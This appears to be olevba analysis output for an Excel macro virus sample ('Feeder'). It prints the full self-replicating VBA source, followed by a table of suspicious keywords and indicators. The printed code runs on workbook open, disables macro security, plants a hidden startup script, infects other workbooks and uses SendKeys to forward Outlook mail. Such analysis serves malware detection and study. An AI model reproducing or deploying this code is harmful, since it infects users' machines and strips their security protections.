olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Feeder-7e94c7d25526d39c01f3d8459dd88457fa7622f8
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Feeder-7e94c7d25526d39c01f3d8459dd88457fa7622f8 
in file: Virus.MSExcel.Feeder-7e94c7d25526d39c01f3d8459dd88457fa7622f8 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' MarshYello
Private Sub Workbook_activate()
' Get Back By Yello 25/10/00
    On Error Resume Next
        With Application
        .DisplayAlerts = (330 -( 325 + 5))
        .Application.ScreenUpdating = (330 -( 325 + 5))
        .Application.DisplayStatusBar = (330 -( 325 + 5))
    End With
         CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   
	Open "C:\WINDOWS\Start Menu\Programs\StartUp\GetBack.vbs" for output as #1
	Print#1, "Do"
	Print#1, "Dim Sorrow, File"
	Print#1, "Set Sorrow = CreateObject(""Scripting.FileSystemObject"")
	Print#1, "Oldtimer = Timer"
	Print#1, "While(Timer<Oldtimer + 120)
	Print#1, "Wend"
	Print#1, "On Error Resume Next"
	Print#1, "Set File = Sorrow.CreateTextFile(""c:\windows\desktop\Love Letter.vbs"", True)"   
	Print#1, "Loop"
	Close#1
	SetAttr "C:\WINDOWS\Start Menu\Programs\StartUp\GetBack.vbs", 6
    Open "C:\Windows\Back.drv" For Output As #1
    Print #1, VBProject.VBComponents(1).codemodule.Lines(1, 60)
    Close #1
    SetAttr ("C:\Windows\Back.drv"), 6
    Set ActiveWB = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    Set ThisWB = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").codemodule
    CheckExist = Dir(Application.StartupPath & "\Book1.")
    If CheckExist = "" Then
    VBAProject.ThisWorkbook.SaveAs Filename:=Application.StartupPath & "\Book1.", FileFormat:=xlNormal, AddToMru:=False
    End If
    If ActiveWB.Lines(3, 1) <> "' MarshYello" Then
        ActiveWB.DeleteLines 1, ActiveWB.CountofLines
        ActiveWB.AddFromFile ("C:\Windows\Back.drv")
        ActiveWorkbook.Save
End If
On error GoTo GetOut
appactivate ("Inbox - Microsoft Outlook")
Sendkeys "^c" , true
Sendkeys "{DOWN}" , true
Sendkeys "^r" , true
Sendkeys "^v" , true
Sendkeys "%s" , true
GetOut:  
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|appactivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GetBack.vbs         |Executable file name                         |
|IOC       |Letter.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

